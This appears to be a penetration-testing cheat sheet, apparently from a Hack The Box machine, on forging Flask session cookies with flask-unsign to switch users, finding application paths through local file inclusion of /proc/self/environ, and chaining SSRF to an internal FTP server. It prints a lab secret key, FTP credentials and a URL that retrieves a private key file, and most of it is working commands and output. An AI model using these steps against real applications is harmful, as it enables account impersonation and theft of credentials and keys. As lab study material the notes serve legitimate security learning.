## How to forge Flask tokens
1)Get the secret key from the main **app.py** source code
Example: `app.config['SECRET_KEY'] = 'xxxxxxxxxxxxxxxxx'`
2)Install this: https://github.com/Paradoxis/Flask-Unsign
3)Decode your session token that you got from your normal user: 
```
flask-unsign --decode --cookie 'COOKIE'
Example Result: {'logged_in': False 'id':5} 
```
4)Use the secretkey to sign a new token with same structure but by editing the id: 
```
flask-unsign --sign --cookie "{'logged_in': True 'id':1}" --secret 'CHANGEME'
```
5)Replace the session token in the browser and you should be switched to another user!

## Default paths
By default the application would be in the root folder as **/app.py**
```
Example: If you find from a LFI that application path of one of the modules points to: /app/app/superpass/views/vault_views.py
```
You can be sure that the main python source would be under 
```
/app/app/superpass/app.py
```

## How to find Path via LFI
Check for flask path in **/proc/self/environ** or **/proc/self/cmdline**
or
Try to read a non-existent file so the **App.py** will throw an error and maybe show paths
Example result (here we can guess that the path is **/app/code/app.py**):
```
python3/app/code/app.py
```

Example result (code from **/app/code/app.py**):
```
from flask import Flask, request, redirect from blueprints.index.index import main_bp from blueprints.report.report
import report_bp from blueprints.auth.auth import auth_bp from blueprints.dashboard.dashboard import dashboard_bp
app = Flask(__name__) app.secret_key = "7ASS7ADA8RF3FD7" app.config['SERVER_NAME'] = 'comprezzor.htb'

From here we can guess that the path of loaded values as:
/app/code/blueprints/index/index.py
/app/code/blueprints/report/report.py
/app/code/blueprints/dashboard/dashboard.py
/app/code/app.py
```

The **dashboard.py** contain creds to FTP:
```
 '../../../') current_datetime = datetime.now().strftime("%Y%m%d%H%M%S") backup_filename = f'app_backup_{current_datetime}.zip' with
zipfile.ZipFile(backup_filename, 'w', zipfile.ZIP_DEFLATED) as zipf: for root, _, files in os.walk(source_directory): for file in files: file_path = os.path.join(root, file) arcname =
os.path.relpath(file_path, source_directory) zipf.write(file_path, arcname=arcname) try: ftp = FTP('ftp.local') ftp.login(user='ftp_admin', passwd='u3jai8y71s2') ftp.cwd('/') with
open(backup_filename, 'rb') as file: ftp.storbinary(f'STOR {backup_filename}', file) ftp.quit() os.remove(backup_filename) flash('Backup and upload completed successfully!', 'success') except Exception as e: flash(f'Error: {str(e)}', 'error') return redirect(url_for('dashboard.dashboard'))
```

From here we can SSRF to ftp
   ftp://ftp_admin:u3jai8y71s2@ftp.local/
```
Result:
-rw-------1	root	root	2655  May 31 08:10	private-8297.key
-rw-r--r--1	root	root	15519 May 31 08:10	welcome_note.pdf
-rw-r--r--1	root	root	1732  May 31 08:10	welcome_note.txt
```
And maybe now we can get the files?
   ftp://ftp_admin:u3jai8y71s2@ftp.local/private-8297.key